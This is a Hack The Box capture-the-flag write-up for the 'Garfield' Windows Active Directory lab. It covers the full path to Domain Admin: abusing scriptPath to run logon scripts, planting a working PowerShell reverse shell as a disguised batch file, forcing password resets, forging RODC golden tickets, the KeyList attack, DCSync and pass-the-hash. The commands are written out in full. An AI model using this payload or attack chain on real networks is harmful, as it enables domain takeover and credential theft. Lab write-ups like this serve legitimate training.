# Garfield — Hack The Box Write-up

**Difficulty:** Hard  
**OS:** Windows Server 2019 (Active Directory)  
**Author:** Ghaith Al-bayati

---

## Introduction

Garfield is a Windows Active Directory environment simulating a real corporate network with two machines — a primary Domain Controller (DC01) and an internal Read-Only Domain Controller (RODC01). The path goes from given domain credentials all the way to Domain Admin through a chain of ACL abuses, logon script hijacking, and a RODC-specific Kerberos attack path most people have never heard of.

**Key skills practiced:**
- Active Directory enumeration (BloodHound, BloodyAD, LDAP, RPC)
- ACL abuse — scriptPath write leading to logon script hijacking
- Forced password reset via AD permissions
- RODC abuse — dumping `krbtgt_XXXX` and forging a RODC Golden Ticket
- KeyList attack to obtain a real TGT from the main DC
- DCSync and Pass the Hash for Domain Admin

---

## Environment

| Machine | Role | Address |
|---------|------|---------|
| DC01.garfield.htb | Primary Domain Controller | Target IP |
| RODC01.garfield.htb | Read-Only Domain Controller | 192.168.100.2 (internal only) |

---

## Phase 1 — Setup

### VPN + /etc/hosts

```bash
sudo openvpn garfield.ovpn
echo "<TARGET_IP> garfield.htb DC01.garfield.htb DC01" | sudo tee -a /etc/hosts
```

Kerberos and LDAP use hostnames — if your machine can't resolve `DC01.garfield.htb`, tools fail silently.

### Clock Sync (DO NOT SKIP)

```bash
sudo timedatectl set-ntp false
sudo ntpdate <TARGET_IP>
```

Kerberos has a hard 5-minute clock skew tolerance. This box had an ~8 hour difference. If you skip this, every single Kerberos-based attack fails and you'll have no idea why. It's one of the most common reasons people get stuck on Windows/AD boxes.

---

## Phase 2 — Reconnaissance

### Nmap

```bash
nmap -sCV -A <TARGET_IP>
```

Key ports:

| Port | Service | Significance |
|------|---------|--------------|
| 53 | DNS | DCs always run DNS |
| 88 | Kerberos | Confirms Active Directory |
| 389 / 3268 | LDAP / Global Catalog | AD database query ports |
| 445 | SMB | File sharing + auth |
| 5985 | WinRM | Remote PowerShell access |
| 3389 | RDP | Remote Desktop |
| 2179 | Hyper-V | DC01 is hosting a VM → that's RODC01 |

Port 2179 is the tell — DC01 is running a virtual machine internally. That VM is RODC01, and it's only reachable from inside DC01 itself. Keep this in mind for later.

---

## Phase 3 — Enumeration

Starting credentials provided by the box: `j.arbuckle : Th1sD4mnC4t!@1978`

### SMB

```bash
smbclient -L //<TARGET_IP> -U "garfield.htb/j.arbuckle%Th1sD4mnC4t\!@1978"
```

Verify creds work and check for non-standard shares. `SYSVOL` and `NETLOGON` are always present on DCs — they store Group Policy and login scripts, which becomes very relevant soon.

### RPC — Users and Groups

```bash
rpcclient -U "garfield.htb/j.arbuckle%Th1sD4mnC4t\!@1978" <TARGET_IP> -c "enumdomusers"
rpcclient -U "garfield.htb/j.arbuckle%Th1sD4mnC4t\!@1978" <TARGET_IP> -c "enumdomgroups"
```

Notable accounts:

- `l.wilson` — regular user with WinRM/RDP access
- `l.wilson_adm` — admin-tier account, Tier 1 group
- `krbtgt_8245` — the RODC's Kerberos service account (critical later)

### LDAP — Computers

```bash
ldapsearch -x -H ldap://<TARGET_IP> -D "j.arbuckle@garfield.htb" -w 'Th1sD4mnC4t!@1978' \
  -b "DC=garfield,DC=htb" "(objectClass=computer)" sAMAccountName
```

Confirms two computers: `DC01$` and `RODC01$`.

### LDAP — RODC Replication Attributes

```bash
ldapsearch ... "(objectClass=computer)" cn msDS-RevealedUsers msDS-NeverRevealGroup msDS-RevealOnDemandGroup
```

This is the endgame hint. These attributes show which accounts have their credentials **cached on RODC01**. The results reveal that `Administrator` and `krbtgt_8245` credentials are in the revealed list — meaning RODC01 has them.

### BloodHound

```bash
bloodhound-python -u j.arbuckle -p 'Th1sD4mnC4t!@1978' \
  -d garfield.htb -dc DC01.garfield.htb -ns <TARGET_IP> -c All
```

Import the JSON files into the BloodHound GUI. **This is the most important enumeration step.** BloodHound maps every relationship in the domain visually and shows you the exact attack path. Key finding: `j.arbuckle` has write access to `scriptPath` on `l.wilson`. That's your foothold.

### BloodyAD — Confirm ACL Write Access

```bash
bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb \
  --host <TARGET_IP> get writable --otype USER --detail
```

Confirms write access to `scriptPath` on `l.wilson`, `l.wilson_adm`, and others.

---

## Phase 4 — Initial Foothold (scriptPath Abuse)

### What is scriptPath?

`scriptPath` is a legacy AD attribute. When set on a user account, Windows executes the specified script every time that user logs into the domain. It's meant for IT automation (drive mapping, etc.). If an attacker can write to this attribute on someone else's account, they can make Windows execute arbitrary code the next time that person authenticates.

### Step 1 — Create the Reverse Shell Payload

```bash
PAYLOAD='$client = New-Object System.Net.Sockets.TCPClient("<YOUR_IP>",4444);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

B64=$(echo -n $PAYLOAD | iconv -t UTF-16LE | base64 -w 0)
```

PowerShell's `-EncodedCommand` flag expects Base64 of a **UTF-16LE** string, not plain UTF-8. This trips people up constantly.

### Step 2 — Wrap in a Batch File and Upload to SYSVOL

```bash
cat > /tmp/printerDetect.bat << EOF
@echo off
powershell -enc $B64
EOF

smbclient //<TARGET_IP>/SYSVOL -U "garfield.htb/j.arbuckle%Th1sD4mnC4t\!@1978" \
  -c 'cd garfield.htb\scripts; put /tmp/printerDetect.bat printerDetect.bat'
```

SYSVOL is readable by all domain-joined machines. Scripts stored here are exactly what `scriptPath` points to.

### Step 3 — Set scriptPath on l.wilson

```bash
bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host <TARGET_IP> \
  set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v printerDetect.bat
```

### Step 4 — Catch the Shell

```bash
nc -lvnp 4444
```

The next time `l.wilson` authenticates, Windows sees the `scriptPath`, finds `printerDetect.bat` in SYSVOL, and runs it. Shell comes back as `garfield\l.wilson`.

---

## Phase 5 — Privilege Escalation to l.wilson_adm

`l.wilson` has the `ForceChangePassword` right over `l.wilson_adm` (discovered via BloodHound). Reset the password from your shell:

```powershell
$newpass = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset
```

Then connect as the hijacked admin account:

```bash
evil-winrm -i <TARGET_IP> -u l.wilson_adm -p 'NewPassword123!'
```

Navigate to the Desktop and grab `user.txt`.

---

## Phase 6 — RODC Abuse (Path to Domain Admin)

This is the unique part of the box. Most people don't know this attack path exists.

### What is a RODC?

A Read-Only Domain Controller is typically deployed in branch offices. It can authenticate users locally, stores a subset of domain credentials, has its own `krbtgt_XXXX` key for issuing Kerberos tickets, and cannot make domain-wide changes. It sounds less dangerous — but it has its own attack path.

### Step 1 — Add l.wilson_adm to RODC Administrators

`l.wilson_adm` has permissions to modify the RODC Administrators group:

```bash
bloodyAD -u l.wilson_adm -p 'NewPassword123!' -d garfield.htb \
  --host <TARGET_IP> add groupMember "RODC Administrators" l.wilson_adm
```

### Step 2 — Dump krbtgt_8245 from RODC01

With admin access to RODC01, extract the `krbtgt_8245` AES256 key. The RODC is only reachable from DC01 internally (remember port 2179), so you do this from your `l.wilson_adm` WinRM session.

### Step 3 — Forge a RODC Golden Ticket

```
Rubeus.exe golden /rodcNumber:8245 /aes256:<KRBTGT_8245_AES256_HASH> \
  /user:Administrator /id:500 /domain:garfield.htb /sid:<DOMAIN_SID> /nowrap
```

A RODC Golden Ticket is a forged TGT signed with RODC's own `krbtgt_8245` key. On its own, DC01 wouldn't trust it for high-privilege operations — but that's where the KeyList attack comes in.

### Step 4 — KeyList Attack

```
Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:<BASE64_RODC_GOLDEN_TICKET> \
  /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /nowrap
```

RODCs can request that the main DC verify credentials for accounts in their allowed replication list. The `/keyList` flag triggers this. DC01 receives the request, sees it's for an account RODC01 is allowed to cache (`Administrator` was in `msDS-RevealedUsers`), and hands back a **real, valid TGT** signed by the main domain's `krbtgt`.

You used a fake RODC ticket to get a real DC01 ticket. DC01 never checked whether the RODC ticket was forged — it just processed the replication request.

### Step 5 — DCSync

```bash
impacket-secretsdump -k -no-pass garfield.htb/Administrator@DC01.garfield.htb
```

With a valid Administrator TGT, impersonate a DC and request hash replication. DC01 dumps every password hash in the domain.

### Step 6 — Pass the Hash → root.txt

```bash
evil-winrm -i DC01.garfield.htb -u Administrator -H <ADMINISTRATOR_NT_HASH>
```

NTLM authentication doesn't require the plaintext password — it uses the NT hash directly. Navigate to the Desktop and grab `root.txt`.

---

## Attack Chain Summary

```
[j.arbuckle] (given creds)
        ↓
BloodHound/BloodyAD → scriptPath write access on l.wilson
        ↓
Upload reverse shell to SYSVOL → set scriptPath → wait for auth
        ↓
Shell as l.wilson
        ↓
l.wilson has ForceChangePassword on l.wilson_adm (ACL)
        ↓
Reset l.wilson_adm password → evil-winrm → user.txt
        ↓
Add l.wilson_adm to RODC Administrators
        ↓
Admin on RODC01 → dump krbtgt_8245 AES256 hash
        ↓
Forge RODC Golden Ticket (Rubeus)
        ↓
KeyList Attack → DC01 returns real TGT for Administrator
        ↓
DCSync (impacket-secretsdump) → Administrator NT Hash
        ↓
Pass the Hash → evil-winrm → root.txt ✅
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service detection |
| smbclient | Browse and interact with SMB shares |
| rpcclient | Enumerate domain users and groups via RPC |
| ldapsearch | Query AD via LDAP directly |
| bloodhound-python | Collect AD data for BloodHound |
| BloodHound (GUI) | Visualize AD attack paths |
| bloodyAD | Modify AD attributes and group memberships |
| netcat | Receive reverse shell connections |
| evil-winrm | Interactive WinRM shell |
| Rubeus | Kerberos attacks (Golden Ticket, KeyList) |
| impacket-secretsdump | DCSync — dump domain hashes |

---

## Why This Box is Hard

1. **Multiple machines** — you have to think about DC01 vs RODC01 as separate targets with different roles
2. **ACL chaining** — multiple privilege hops, each only discoverable through careful enumeration
3. **RODC abuse** — the KeyList attack is barely documented and most people have never seen it
4. **Kerberos knowledge** — you need to understand TGTs, krbtgt, and how RODC delegation works at a non-surface level
5. **Clock sync** — subtle, silent, and breaks everything if you miss it

---

## Key Concepts

| Concept | What it is |
|---------|-----------|
| scriptPath | Legacy AD attribute — sets a login script that runs when a user authenticates |
| RODC | Read-only DC for branch offices — has its own `krbtgt_XXXX` key |
| krbtgt | Special account whose hash signs all Kerberos TGTs in the domain |
| Golden Ticket | Forged TGT created using the krbtgt hash — valid for any user |
| KeyList Attack | Using a RODC golden ticket to trick the main DC into issuing a real TGT |
| DCSync | Impersonating a DC to replicate and dump all domain password hashes |
| Pass the Hash | Authenticating with an NT hash instead of a plaintext password |
| msDS-RevealedUsers | LDAP attribute listing accounts whose creds are cached on a RODC |

---

*Write-up by Ghaith Al-bayati — Hack The Box: Garfield (Season 10, April 2026)*
